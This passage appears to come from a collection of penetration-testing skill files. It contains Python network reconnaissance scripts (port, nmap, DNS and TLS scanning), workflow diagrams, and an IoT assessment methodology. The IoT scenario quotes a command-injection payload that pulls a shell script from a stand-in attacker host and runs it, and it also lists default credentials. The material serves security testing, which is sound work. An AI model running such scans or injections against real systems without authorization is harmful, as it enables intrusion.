Scans 22 common ports by default. Returns open ports with service banners.

### `run_nmap_scan(target, scan_type)` — Execute nmap and parse XML results
Scan types: `quick` (top 100 -sV), `full` (-p- -sC), `vuln` (NSE vuln scripts), `udp` (top 50 UDP).

### `dns_enumeration(domain)` — Enumerate DNS records and subdomains
Queries A, AAAA, MX, NS, TXT, SOA, CNAME records. Tests 10 common subdomain prefixes.

### `ssl_check(host, port)` — Inspect TLS certificate and cipher suite
Returns subject, issuer, validity dates, TLS version, and negotiated cipher.

## Default Port List
21 (FTP), 22 (SSH), 23 (Telnet), 25 (SMTP), 53 (DNS), 80 (HTTP), 110 (POP3),
135 (RPC), 139 (NetBIOS), 143 (IMAP), 443 (HTTPS), 445 (SMB), 993/995 (IMAPS/POP3S),
1433 (MSSQL), 1521 (Oracle), 3306 (MySQL), 3389 (RDP), 5432 (PostgreSQL),
5900 (VNC), 8080/8443 (HTTP Proxy/Alt HTTPS)

## Dependencies
```
pip install dnspython
```
System: nmap (optional, for advanced scanning)

===== END FILE =====


===== FILE: skills/performing-external-network-penetration-test/references/standards.md =====
# Standards and Frameworks — External Network Penetration Testing

## Primary Standards

### PTES (Penetration Testing Execution Standard)
- Website: http://www.pentest-standard.org/
- Phases: Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, Reporting
- Best for: Comprehensive network penetration testing engagements

### NIST SP 800-115
- Title: Technical Guide to Information Security Testing and Assessment
- URL: https://csrc.nist.gov/publications/detail/sp/800-115/final
- Covers: Review techniques, target identification, vulnerability analysis, planning, execution, post-testing

### OSSTMM v3 (Open Source Security Testing Methodology Manual)
- URL: https://www.isecom.org/OSSTMM.3.pdf
- Focus: Operational security testing across physical, wireless, telecommunications, data networks, and human channels

### OWASP Testing Guide v4.2
- URL: https://owasp.org/www-project-web-security-testing-guide/
- Focus: Web application security testing methodology
- Complement to network-level testing

## Compliance Frameworks

| Framework | Requirement | Pentest Frequency |
|-----------|------------|-------------------|
| PCI DSS v4.0 | Requirement 11.4 | Annual + after significant changes |
| SOC 2 Type II | CC7.1 | Annual |
| ISO 27001 | A.12.6, A.18.2 | Annual recommended |
| HIPAA | §164.308(a)(8) | Annual recommended |
| FedRAMP | CA-8 | Annual |

## CVSS v3.1 Scoring Reference

| Metric Group | Components |
|-------------|-----------|
| Base Score | Attack Vector, Attack Complexity, Privileges Required, User Interaction, Scope, Confidentiality, Integrity, Availability |
| Temporal Score | Exploit Code Maturity, Remediation Level, Report Confidence |
| Environmental Score | Modified Base Metrics, Security Requirements |

Calculator: https://www.first.org/cvss/calculator/3.1

## CVE and Vulnerability Databases

- NVD (National Vulnerability Database): https://nvd.nist.gov/
- CVE: https://cve.mitre.org/
- Exploit-DB: https://www.exploit-db.com/
- VulnDB: https://vuldb.com/

===== END FILE =====


===== FILE: skills/performing-external-network-penetration-test/references/workflows.md =====
# Workflows — External Network Penetration Testing

## End-to-End Workflow

```
┌─────────────────┐    ┌──────────────────┐    ┌─────────────────────┐
│ Pre-Engagement   │───>│  Reconnaissance   │───>│ Vulnerability        │
│ - Scoping        │    │  - Passive OSINT  │    │ Analysis             │
│ - RoE signing    │    │  - Active scanning│    │ - Automated scans    │
│ - Legal docs     │    │  - Enum subdomains│    │ - Manual validation  │
└─────────────────┘    └──────────────────┘    └─────────────────────┘
                                                          │
┌─────────────────┐    ┌──────────────────┐    ┌──────────▼──────────┐
│   Reporting      │<───│ Post-Exploitation │<───│   Exploitation       │
│ - Findings doc   │    │  - Priv escalation│    │ - Service exploits   │
│ - CVSS scoring   │    │  - Persistence    │    │ - Web app attacks    │
│ - Remediation    │    │  - Pivoting proof  │    │ - Password attacks   │
│ - Executive brief│    │  - Evidence gather │    │ - Credential spray   │
└─────────────────┘    └──────────────────┘    └─────────────────────┘
```

## Daily Testing Workflow

```
Morning:
  1. Review previous day's findings
  2. Update target list with new discoveries
  3. Run updated scans on newly discovered hosts
  4. Verify scan results and triage

Afternoon:
  5. Manual exploitation of high-value targets
  6. Attempt lateral movement from compromised hosts
  7. Document all successful and failed exploitation attempts

Evening:
  8. Compile evidence and screenshots
  9. Update findings tracker
  10. Plan next day's attack vectors
  11. Communicate critical findings to client immediately
```

## Reconnaissance Sub-Workflow

```
Domain Target
    │
    ├── DNS Enumeration ──> Subdomain Discovery ──> IP Resolution
    │                                                    │
    ├── WHOIS/ASN Lookup ──> IP Range Identification ────┤
    │                                                    │
    ├── Certificate Transparency ──> Hidden Subdomains ──┤
    │                                                    │
    ├── Shodan/Censys ──> Service Fingerprinting ────────┤
    │                                                    │
    └── OSINT (GitHub, Pastebin) ──> Credential Leaks    │
                                                         ▼
                                              Master Target List
                                           (IPs, Ports, Services)
```

## Vulnerability Triage Workflow

```
Scan Results
    │
    ├── Critical (CVSS >= 9.0) ──> Immediate exploitation attempt
    │                               ──> Notify client if RCE confirmed
    │
    ├── High (CVSS 7.0-8.9) ──> Validate and exploit within 24h
    │
    ├── Medium (CVSS 4.0-6.9) ──> Validate, exploit if time permits
    │
    └── Low/Info (CVSS < 4.0) ──> Document, include in final report
```

## Evidence Collection Workflow

```
For each successful exploitation:
  1. Screenshot the exploit execution
  2. Record terminal output (script command or asciinema)
  3. Capture network traffic (tcpdump/Wireshark)
  4. Document exact commands/payloads used
  5. Note timestamps (UTC)
  6. Hash any files extracted (SHA-256)
  7. Store evidence in organized folder structure:
     evidence/
     ├── {date}/
     │   ├── {target-ip}/
     │   │   ├── screenshots/
     │   │   ├── terminal_logs/
     │   │   ├── pcaps/
     │   │   └── notes.md
```

===== END FILE =====


===== FILE: skills/performing-external-network-penetration-test/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for performing external network penetration test reconnaissance and scanning."""

import json
import argparse
import subprocess
import socket
from datetime import datetime


def tcp_port_scan(host, ports=None):
    """Scan common TCP ports on a target host."""
    if ports is None:
        ports = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]
    results = []
    for port in ports:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        try:
            sock.connect((host, port))
            try:
                banner = sock.recv(1024).decode("utf-8", errors="replace").strip()[:200]
            except Exception:
                banner = ""
            results.append({"port": port, "state": "open", "banner": banner})
        except (socket.timeout, ConnectionRefusedError, OSError):
            pass
        finally:
            sock.close()
    return {"host": host, "open_ports": results, "scanned": len(ports), "timestamp": datetime.utcnow().isoformat()}


def run_nmap_scan(target, scan_type="quick"):
    """Run nmap scan against target."""
    scan_args = {
        "quick": ["-sV", "-T4", "--top-ports", "100"],
        "full": ["-sV", "-sC", "-p-", "-T3"],
        "vuln": ["-sV", "--script", "vuln", "--top-ports", "1000"],
        "udp": ["-sU", "--top-ports", "50", "-T4"],
    }
    args = scan_args.get(scan_type, scan_args["quick"])
    cmd = ["nmap", "-oX", "-"] + args + [target]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        import xml.etree.ElementTree as ET
        root = ET.fromstring(result.stdout)
        hosts = []
        for host in root.findall(".//host"):
            addr = host.find("address").get("addr", "") if host.find("address") is not None else ""
            ports = []
            for port in host.findall(".//port"):
                state = port.find("state")
                service = port.find("service")
                ports.append({
                    "port": int(port.get("portid", 0)),
                    "protocol": port.get("protocol", ""),
                    "state": state.get("state", "") if state is not None else "",
                    "service": service.get("name", "") if service is not None else "",
                    "version": service.get("product", "") + " " + service.get("version", "") if service is not None else "",
                })
            hosts.append({"ip": addr, "ports": ports})
        return {"target": target, "scan_type": scan_type, "hosts": hosts}
    except FileNotFoundError:
        return {"error": "nmap not installed"}
    except Exception as e:
        return {"error": str(e)}


def dns_enumeration(domain):
    """Enumerate DNS records for a domain."""
    try:
        import dns.resolver
    except ImportError:
        return {"error": "dnspython not installed — pip install dnspython"}
    records = {}
    for rtype in ["A", "AAAA", "MX", "NS", "TXT", "SOA", "CNAME"]:
        try:
            answers = dns.resolver.resolve(domain, rtype)
            records[rtype] = [str(r) for r in answers]
        except Exception:
            pass
    subdomains = ["www", "mail", "ftp", "vpn", "remote", "api", "dev", "staging", "admin", "portal"]
    found_subs = []
    for sub in subdomains:
        try:
            answers = dns.resolver.resolve(f"{sub}.{domain}", "A")
            found_subs.append({"subdomain": f"{sub}.{domain}", "ips": [str(r) for r in answers]})
        except Exception:
            pass
    return {"domain": domain, "records": records, "subdomains": found_subs}


def ssl_check(host, port=443):
    """Check SSL/TLS certificate details."""
    import ssl
    ctx = ssl.create_default_context()
    try:
        with ctx.wrap_socket(socket.socket(), server_hostname=host) as s:
            s.settimeout(10)
            s.connect((host, port))
            cert = s.getpeercert()
            return {
                "host": host, "port": port,
                "subject": dict(x[0] for x in cert.get("subject", [])),
                "issuer": dict(x[0] for x in cert.get("issuer", [])),
                "notBefore": cert.get("notBefore"),
                "notAfter": cert.get("notAfter"),
                "version": s.version(),
                "cipher": s.cipher(),
            }
    except Exception as e:
        return {"host": host, "error": str(e)}


def main():
    parser = argparse.ArgumentParser(description="External Network Penetration Test Agent")
    sub = parser.add_subparsers(dest="command")
    s = sub.add_parser("scan", help="TCP port scan")
    s.add_argument("--host", required=True)
    s.add_argument("--ports", nargs="*", type=int)
    n = sub.add_parser("nmap", help="Run nmap scan")
    n.add_argument("--target", required=True)
    n.add_argument("--type", default="quick", choices=["quick", "full", "vuln", "udp"])
    d = sub.add_parser("dns", help="DNS enumeration")
    d.add_argument("--domain", required=True)
    c = sub.add_parser("ssl", help="SSL certificate check")
    c.add_argument("--host", required=True)
    c.add_argument("--port", type=int, default=443)
    args = parser.parse_args()
    if args.command == "scan":
        result = tcp_port_scan(args.host, args.ports)
    elif args.command == "nmap":
        result = run_nmap_scan(args.target, args.type)
    elif args.command == "dns":
        result = dns_enumeration(args.domain)
    elif args.command == "ssl":
        result = ssl_check(args.host, args.port)
    else:
        parser.print_help()
        return
    print(json.dumps(result, indent=2, default=str))


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-external-network-penetration-test/scripts/process.py =====
#!/usr/bin/env python3
"""
External Network Penetration Test — Automation Process

Automates reconnaissance, scanning, and reporting phases of an external
network penetration test. Requires: nmap, subfinder, nuclei, python-nmap.

Usage:
    python process.py --target target.com --ip-range 203.0.113.0/24 --output ./results
"""

import subprocess
import json
import csv
import os
import sys
import argparse
import socket
import ssl
import datetime
import ipaddress
from pathlib import Path
from typing import Optional


def run_command(cmd: list[str], timeout: int = 300) -> tuple[str, str, int]:
    """Execute a shell command and return stdout, stderr, return code."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        return result.stdout, result.stderr, result.returncode
    except subprocess.TimeoutExpired:
        return "", f"Command timed out after {timeout}s", -1
    except FileNotFoundError:
        return "", f"Command not found: {cmd[0]}", -1


def enumerate_subdomains(domain: str, output_dir: Path) -> list[str]:
    """Enumerate subdomains using subfinder."""
    print(f"[*] Enumerating subdomains for {domain}...")
    subfinder_out = output_dir / "subdomains_subfinder.txt"

    stdout, stderr, rc = run_command(
        ["subfinder", "-d", domain, "-silent", "-o", str(subfinder_out)],
        timeout=600
    )

    subdomains = set()
    if subfinder_out.exists():
        with open(subfinder_out) as f:
            subdomains.update(line.strip() for line in f if line.strip())

    print(f"[+] Found {len(subdomains)} subdomains")
    return sorted(subdomains)


def resolve_domains(subdomains: list[str], output_dir: Path) -> dict[str, list[str]]:
    """Resolve subdomains to IP addresses."""
    print(f"[*] Resolving {len(subdomains)} subdomains...")
    resolved = {}
    for sub in subdomains:
        try:
            ips = [r[4][0] for r in socket.getaddrinfo(sub, None, socket.AF_INET)]
            resolved[sub] = list(set(ips))
        except socket.gaierror:
            continue

    output_file = output_dir / "resolved_domains.json"
    with open(output_file, "w") as f:
        json.dump(resolved, f, indent=2)

    unique_ips = set()
    for ips in resolved.values():
        unique_ips.update(ips)
    print(f"[+] Resolved to {len(unique_ips)} unique IPs")
    return resolved


def nmap_scan(targets: str, output_dir: Path, scan_type: str = "quick") -> dict:
    """Run nmap scan on target range."""
    print(f"[*] Running nmap {scan_type} scan on {targets}...")
    output_prefix = str(output_dir / f"nmap_{scan_type}")

    if scan_type == "quick":
        cmd = ["nmap", "-sS", "-sV", "--top-ports", "1000", "-T4",
               "-oA", output_prefix, targets]
    elif scan_type == "full":
        cmd = ["nmap", "-sS", "-sV", "-p-", "-T4", "--min-rate", "1000",
               "-oA", output_prefix, targets]
    elif scan_type == "udp":
        cmd = ["nmap", "-sU", "--top-ports", "100", "-T4",
               "-oA", output_prefix, targets]
    elif scan_type == "scripts":
        cmd = ["nmap", "-sV", "-sC", "--script=vuln,exploit",
               "-oA", output_prefix, targets]
    else:
        cmd = ["nmap", "-sS", "-sV", "-T4",
               "-oA", output_prefix, targets]

    stdout, stderr, rc = run_command(cmd, timeout=3600)

    results = {
        "scan_type": scan_type,
        "targets": targets,
        "return_code": rc,
        "output_files": {
            "nmap": f"{output_prefix}.nmap",
            "xml": f"{output_prefix}.xml",
            "gnmap": f"{output_prefix}.gnmap",
        }
    }

    if rc == 0:
        print(f"[+] Nmap {scan_type} scan completed successfully")
    else:
        print(f"[-] Nmap scan returned code {rc}: {stderr[:200]}")

    return results


def check_ssl_tls(host: str, port: int = 443) -> dict:
    """Check SSL/TLS configuration for a host."""
    result = {
        "host": host,
        "port": port,
        "ssl_version": None,
        "cipher": None,
        "cert_subject": None,
        "cert_issuer": None,
        "cert_expiry": None,
        "issues": []
    }

    try:
        context = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=host) as ssock:
                result["ssl_version"] = ssock.version()
                result["cipher"] = ssock.cipher()
                cert = ssock.getpeercert()
                if cert:
                    result["cert_subject"] = dict(x[0] for x in cert.get("subject", []))
                    result["cert_issuer"] = dict(x[0] for x in cert.get("issuer", []))
                    result["cert_expiry"] = cert.get("notAfter")

                    # Check expiry
                    expiry = datetime.datetime.strptime(
                        cert["notAfter"], "%b %d %H:%M:%S %Y %Z"
                    )
                    if expiry < datetime.datetime.now():
                        result["issues"].append("Certificate expired")
                    elif expiry < datetime.datetime.now() + datetime.timedelta(days=30):
                        result["issues"].append("Certificate expires within 30 days")

    except ssl.SSLCertVerificationError as e:
        result["issues"].append(f"Certificate verification failed: {e}")
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        result["issues"].append(f"Connection failed: {e}")

    return result


def run_nuclei_scan(targets_file: str, output_dir: Path) -> str:
    """Run nuclei vulnerability scanner."""
    print("[*] Running nuclei vulnerability scan...")
    output_file = output_dir / "nuclei_results.json"

    cmd = [
        "nuclei", "-l", targets_file,
        "-severity", "critical,high,medium",
        "-json", "-o", str(output_file),
        "-rate-limit", "50",
        "-bulk-size", "25",
        "-concurrency", "10"
    ]

    stdout, stderr, rc = run_command(cmd, timeout=3600)

    if rc == 0:
        print(f"[+] Nuclei scan completed. Results: {output_file}")
    else:
        print(f"[-] Nuclei scan issue: {stderr[:200]}")

    return str(output_file)


def parse_nmap_gnmap(gnmap_file: str) -> list[dict]:
    """Parse nmap gnmap output to extract open ports."""
    hosts = []
    try:
        with open(gnmap_file) as f:
            for line in f:
                if "Ports:" not in line:
                    continue
                parts = line.split("\t")
                host_part = parts[0]
                ip = host_part.split(" ")[1]
                ports_part = [p for p in parts if p.startswith("Ports:")]
                if not ports_part:
                    continue
                port_entries = ports_part[0].replace("Ports: ", "").split(", ")
                open_ports = []
                for entry in port_entries:
                    fields = entry.strip().split("/")
                    if len(fields) >= 5 and fields[1] == "open":
                        open_ports.append({
                            "port": int(fields[0]),
                            "protocol": fields[2],
                            "service": fields[4],
                            "version": fields[6] if len(fields) > 6 else ""
                        })
                if open_ports:
                    hosts.append({"ip": ip, "open_ports": open_ports})
    except FileNotFoundError:
        print(f"[-] File not found: {gnmap_file}")

    return hosts


def generate_report(
    scan_results: dict,
    resolved: dict,
    ssl_results: list[dict],
    output_dir: Path
) -> str:
    """Generate a summary report in markdown format."""
    print("[*] Generating report...")
    report_file = output_dir / "pentest_report.md"
    timestamp = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%d %H:%M UTC")

    with open(report_file, "w") as f:
        f.write(f"# External Network Penetration Test Report\n\n")
        f.write(f"**Generated:** {timestamp}\n\n")
        f.write("---\n\n")

        # Subdomain summary
        f.write("## Subdomain Enumeration\n\n")
        f.write(f"Total subdomains discovered: **{len(resolved)}**\n\n")
        unique_ips = set()
        for ips in resolved.values():
            unique_ips.update(ips)
        f.write(f"Unique IP addresses: **{len(unique_ips)}**\n\n")

        if resolved:
            f.write("| Subdomain | IP Address(es) |\n")
            f.write("|-----------|---------------|\n")
            for sub, ips in sorted(resolved.items()):
                f.write(f"| {sub} | {', '.join(ips)} |\n")
            f.write("\n")

        # Port scan summary
        f.write("## Port Scan Results\n\n")
        for scan_type, result in scan_results.items():
            f.write(f"### {scan_type.title()} Scan\n\n")
            gnmap = result.get("output_files", {}).get("gnmap")
            if gnmap and os.path.exists(gnmap):
                hosts = parse_nmap_gnmap(gnmap)
                if hosts:
                    for host in hosts:
                        f.write(f"**{host['ip']}**\n\n")
                        f.write("| Port | Protocol | Service | Version |\n")
                        f.write("|------|----------|---------|----------|\n")
                        for port in host["open_ports"]:
                            f.write(
                                f"| {port['port']} | {port['protocol']} "
                                f"| {port['service']} | {port['version']} |\n"
                            )
                        f.write("\n")
                else:
                    f.write("No open ports discovered in this scan.\n\n")
            else:
                f.write(f"Scan output not available (return code: {result.get('return_code')})\n\n")

        # SSL/TLS results
        f.write("## SSL/TLS Assessment\n\n")
        if ssl_results:
            f.write("| Host | SSL Version | Cipher | Expiry | Issues |\n")
            f.write("|------|-------------|--------|--------|--------|\n")
            for sr in ssl_results:
                issues = "; ".join(sr["issues"]) if sr["issues"] else "None"
                f.write(
                    f"| {sr['host']} | {sr.get('ssl_version', 'N/A')} "
                    f"| {sr.get('cipher', ('N/A',))[0] if sr.get('cipher') else 'N/A'} "
                    f"| {sr.get('cert_expiry', 'N/A')} | {issues} |\n"
                )
            f.write("\n")

        # Recommendations
        f.write("## Recommendations\n\n")
        f.write("1. Remediate all critical and high severity findings within 48 hours\n")
        f.write("2. Patch all identified CVEs on internet-facing services\n")
        f.write("3. Implement network segmentation for exposed services\n")
        f.write("4. Enable MFA on all externally accessible portals\n")
        f.write("5. Deploy WAF for web-facing applications\n")
        f.write("6. Review and harden TLS configurations\n")
        f.write("7. Remove unnecessary open ports and services\n")
        f.write("8. Implement rate limiting and account lockout policies\n\n")

        f.write("---\n")
        f.write(f"*Report generated by external pentest automation tool*\n")

    print(f"[+] Report generated: {report_file}")
    return str(report_file)


def main():
    parser = argparse.ArgumentParser(
        description="External Network Penetration Test Automation"
    )
    parser.add_argument("--target", required=True, help="Target domain (e.g., target.com)")
    parser.add_argument("--ip-range", help="Target IP range in CIDR notation")
    parser.add_argument("--output", default="./results", help="Output directory")
    parser.add_argument("--skip-recon", action="store_true", help="Skip reconnaissance phase")
    parser.add_argument("--skip-scan", action="store_true", help="Skip scanning phase")
    parser.add_argument("--scan-type", default="quick",
                        choices=["quick", "full", "udp", "scripts"],
                        help="Nmap scan type")
    args = parser.parse_args()

    output_dir = Path(args.output)
    output_dir.mkdir(parents=True, exist_ok=True)
    (output_dir / "evidence").mkdir(exist_ok=True)
    (output_dir / "scans").mkdir(exist_ok=True)

    print("=" * 60)
    print(" External Network Penetration Test")
    print(f" Target: {args.target}")
    print(f" Output: {output_dir.absolute()}")
    print(f" Started: {datetime.datetime.now(datetime.timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}")
    print("=" * 60)

    # Phase 1: Reconnaissance
    resolved = {}
    if not args.skip_recon:
        subdomains = enumerate_subdomains(args.target, output_dir)
        resolved = resolve_domains(subdomains, output_dir)
    else:
        print("[*] Skipping reconnaissance phase")

    # Phase 2: Scanning
    scan_results = {}
    ssl_results = []
    if not args.skip_scan:
        scan_target = args.ip_range or args.target
        scan_results[args.scan_type] = nmap_scan(
            scan_target, output_dir / "scans", args.scan_type
        )

        # SSL/TLS checks on discovered web services
        ssl_hosts = [args.target]
        if resolved:
            ssl_hosts.extend(list(resolved.keys())[:20])
        for host in ssl_hosts:
            ssl_result = check_ssl_tls(host)
            if ssl_result["ssl_version"] or ssl_result["issues"]:
                ssl_results.append(ssl_result)
    else:
        print("[*] Skipping scanning phase")

    # Phase 3: Nuclei scan
    targets_file = output_dir / "targets.txt"
    with open(targets_file, "w") as f:
        f.write(f"https://{args.target}\n")
        for sub in resolved:
            f.write(f"https://{sub}\n")
    run_nuclei_scan(str(targets_file), output_dir)

    # Phase 4: Report generation
    report_path = generate_report(scan_results, resolved, ssl_results, output_dir)

    print("\n" + "=" * 60)
    print(" Penetration Test Automation Complete")
    print(f" Report: {report_path}")
    print("=" * 60)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-iot-security-assessment/SKILL.md =====
---
name: performing-iot-security-assessment
description: 'Performs comprehensive security assessments of IoT devices and their
  ecosystems by testing hardware interfaces, firmware, network communications, cloud
  APIs, and companion mobile applications. The tester uses firmware extraction and
  analysis, hardware debugging via UART and JTAG, network protocol analysis, and runtime
  exploitation to identify vulnerabilities across all layers of the IoT stack. Activates
  for requests involving IoT security testing, embedded device assessment, firmware
  security analysis, or smart device penetration testing.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- IoT-security
- firmware-analysis
- embedded-systems
- hardware-hacking
- UART-JTAG
version: 1.0.0
author: mahipal
license: Apache-2.0
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1078.004
---
# Performing IoT Security Assessment

## When to Use

- Evaluating the security of IoT devices before deployment in enterprise or critical infrastructure environments
- Assessing consumer IoT products for security vulnerabilities as part of product security review or certification
- Testing industrial IoT (IIoT) devices for vulnerabilities that could affect operational technology environments
- Analyzing firmware for backdoors, hardcoded credentials, and known vulnerabilities in embedded components
- Evaluating the security of the complete IoT ecosystem including device, cloud backend, and mobile companion app

**Do not use** against IoT devices without written authorization, for modifying firmware on devices you do not own, or against medical devices or safety-critical systems without specific medical device testing authorization and safety protocols.

## Prerequisites

- Physical access to the target IoT device(s) for hardware analysis and testing
- Hardware tools: USB-to-UART adapter (FTDI), Bus Pirate, logic analyzer, JTAG debugger (Segger J-Link), SPI flash programmer (CH341A)
- Firmware analysis tools: Binwalk, Firmwalker, Firmware Analysis Toolkit (FAT), Ghidra, QEMU for emulation
- Network analysis: Wireshark, tcpdump, Bluetooth tools (Ubertooth, nRF Connect), Zigbee tools (KillerBee)
- Soldering equipment for accessing hardware debug points if needed

## Workflow

### Step 1: Device Reconnaissance and Hardware Analysis

Examine the physical device and identify attack surfaces:

- **External inspection**: Document all physical interfaces (USB, Ethernet, serial ports, SD card slots), labels, FCC ID, and model numbers
- **FCC ID lookup**: Search the FCC database (fcc.gov/oet/ea/fccid) using the FCC ID to find internal photos, schematics, and radio frequency information
- **PCB analysis**: Open the device enclosure and photograph the PCB. Identify:
  - Main processor/SoC (read markings, search datasheet)
  - Flash memory chips (SPI NOR, NAND, eMMC)
  - Debug headers and test points
  - UART/JTAG/SWD pins (look for 4-pin or 10-pin headers, or unpopulated pads)
- **UART identification**: Use a multimeter to identify UART pins (TX, RX, GND, VCC). Connect USB-to-UART adapter and attempt serial console access at common baud rates (9600, 38400, 57600, 115200)
- **JTAG identification**: Use JTAGulator or manual probing to identify JTAG pins (TCK, TMS, TDI, TDO, TRST). Connect JTAG debugger for memory access and debugging.

### Step 2: Firmware Extraction and Analysis

Extract and analyze the device firmware:

- **Firmware acquisition methods**:
  - Download from manufacturer website or update server
  - Extract from flash memory using SPI programmer: connect CH341A to SPI flash, read with `flashrom -p ch341a_spi -r firmware.bin`
  - Capture over-the-air updates via network interception
  - Extract from UART bootloader console (U-Boot: `md.b` memory dump)
- **Firmware unpacking**: `binwalk -e firmware.bin` to extract filesystem, kernel, and bootloader components
- **Filesystem analysis**:
  - Search for credentials: `grep -rn "password\|passwd\|secret\|key" squashfs-root/`
  - Examine `/etc/shadow` for password hashes
  - Review startup scripts in `/etc/init.d/` for insecure service configurations
  - Identify web server configurations and CGI scripts for web interface vulnerabilities
  - Use Firmwalker: `./firmwalker.sh squashfs-root/` for automated sensitive data discovery
- **Binary analysis**: Use Ghidra to reverse engineer key binaries (web server, management daemon, authentication modules) for hardcoded credentials, command injection, and buffer overflow vulnerabilities
- **Known vulnerability scanning**: Extract software versions and cross-reference with CVE databases. Use `firmware-analysis-toolkit` for automated CVE scanning.

### Step 3: Network Communication Analysis

Analyze all network traffic from the IoT device:

- **Traffic capture**: Connect the device to a network with traffic mirroring (SPAN port) or use an inline transparent bridge. Capture all traffic with Wireshark.
- **Protocol analysis**: Identify all protocols used (HTTP, HTTPS, MQTT, CoAP, AMQP, custom TCP/UDP). Check for unencrypted sensitive data transmission.
- **TLS analysis**: Verify TLS implementation: certificate validation, cipher suite strength, certificate pinning. Attempt MITM interception with Burp Suite.
- **Cloud API analysis**: Intercept device-to-cloud communication to identify API endpoints, authentication methods, and data transmitted. Test for IDOR, authentication bypass, and excessive data exposure.
- **Bluetooth/BLE testing**: Use nRF Connect or Ubertooth to enumerate BLE services and characteristics. Test for unauthenticated access, plaintext data transmission, and static pairing keys.
- **Zigbee/Z-Wave testing**: Use KillerBee framework to capture and analyze Zigbee traffic, test for replay attacks, and check key exchange security.

### Step 4: Firmware Emulation and Dynamic Testing

Emulate the firmware for dynamic security testing:

- **QEMU emulation**: Use FirmAE or Firmadyne to emulate the extracted firmware: `python3 fat.py firmware.bin` to boot the firmware in an emulated environment
- **Web interface testing**: Access the device's web management interface from the emulated environment and test for:
  - Default credentials (admin:admin, root:root, admin:password)
  - Command injection in configuration parameters
  - Authentication bypass via direct URL access
  - Cross-site scripting in all input fields
  - CSRF in state-changing operations
- **Service testing**: Use Nmap to scan the emulated device for all open ports and test each service for known vulnerabilities
- **Fuzzing**: Fuzz network services using Boofuzz or AFL to discover memory corruption vulnerabilities in embedded services

### Step 5: Exploitation and Impact Demonstration

Exploit identified vulnerabilities to demonstrate impact:

- **Remote code execution**: Chain discovered vulnerabilities (command injection, buffer overflow) to achieve remote code execution on the device
- **Credential extraction**: Extract and crack credentials found in firmware, memory dumps, or network captures
- **Lateral movement**: Demonstrate how a compromised IoT device can be used to attack other devices on the network
- **Persistence**: Show how an attacker could maintain access to the device across firmware updates or reboots
- **Physical impact**: For IIoT devices, demonstrate the potential for physical manipulation (changing sensor readings, modifying actuator commands)

## Key Concepts

| Term | Definition |
|------|------------|
| **UART** | Universal Asynchronous Receiver/Transmitter; a serial communication interface commonly used for debug consoles on embedded devices, often providing root shell access |
| **JTAG** | Joint Test Action Group; a hardware debugging interface that provides direct access to the processor for memory reading, code debugging, and firmware extraction |
| **Firmware** | The software embedded in the device's flash memory that controls its operation, typically consisting of a bootloader, operating system kernel, and root filesystem |
| **Binwalk** | A firmware analysis tool that identifies and extracts embedded file systems, compressed archives, and binary components from firmware images |
| **MQTT** | Message Queuing Telemetry Transport; a lightweight publish/subscribe protocol commonly used for IoT device communication, often deployed without authentication |
| **BLE** | Bluetooth Low Energy; a wireless protocol used by many IoT devices for short-range communication, susceptible to eavesdropping and unauthorized access if not properly secured |

## Tools & Systems

- **Binwalk**: Firmware extraction and analysis tool that identifies file system types, compression formats, and embedded data within firmware images
- **Ghidra**: NSA's open-source reverse engineering framework for analyzing embedded device binaries across ARM, MIPS, and other architectures
- **FirmAE/Firmadyne**: Automated firmware emulation platforms that boot extracted Linux-based IoT firmware in QEMU for dynamic testing
- **Bus Pirate**: Hardware hacking multi-tool supporting UART, SPI, I2C, and JTAG protocols for interfacing with embedded device debug interfaces
- **Wireshark**: Network protocol analyzer for capturing and analyzing IoT device network traffic across all protocol layers

## Common Scenarios

### Scenario: Enterprise IP Camera Security Assessment

**Context**: A company plans to deploy 200 IP cameras from a single vendor across its offices. Before deployment, the security team requests a penetration test of the camera to identify vulnerabilities that could be exploited to gain access to the corporate network.

**Approach**:
1. Open the camera and identify UART pins on the PCB; connect and access a root shell at 115200 baud with no password
2. Extract firmware from the SPI flash chip and analyze with Binwalk: discover embedded Linux with BusyBox, lighttpd web server, and custom management daemon
3. Find hardcoded credentials in `/etc/shadow` (root:$1$abc$hashedpassword) and crack the MD5 hash in seconds (password: camera123)
4. Web interface testing reveals command injection in the NTP server configuration field: `; wget http://attacker.com/shell.sh | sh`
5. Network analysis shows the camera sends RTSP streams unencrypted and has ONVIF services exposed without authentication
6. Demonstrate pivoting: from the compromised camera, scan the corporate network and access 3 internal servers
7. Report recommends network segmentation, firmware vendor engagement, and deployment of cameras on an isolated VLAN

**Pitfalls**:
- Focusing only on the web interface and missing UART/JTAG access that provides a root shell with no authentication
- Not analyzing the firmware for hardcoded credentials that may be shared across all devices of the same model
- Testing the device in isolation and missing network-level risks from deploying vulnerable devices on the corporate network
- Overlooking the cloud connectivity and mobile app components that may expose additional attack surfaces

## Output Format

```
## Finding: Unauthenticated Root Shell via UART Debug Interface

**ID**: IOT-001
**Severity**: Critical (CVSS 9.0)
**Device**: ModelCam X200 IP Camera (Firmware v3.2.1)
**Interface**: UART serial console (115200 baud, 8N1)

**Description**:
The IP camera exposes a UART serial interface on the PCB that provides
direct root shell access without authentication. An attacker with physical
access to the device can connect a USB-to-UART adapter and obtain full
root access to the embedded Linux operating system.

**Proof of Concept**:
1. Opened device enclosure (4 Philips screws, no tamper detection)
2. Connected FTDI adapter to UART pins (J3 header on PCB)
3. Serial terminal at 115200 8N1: immediate root shell prompt
4. root@camera:~# id -> uid=0(root) gid=0(root)

**Additional Findings from Root Access**:
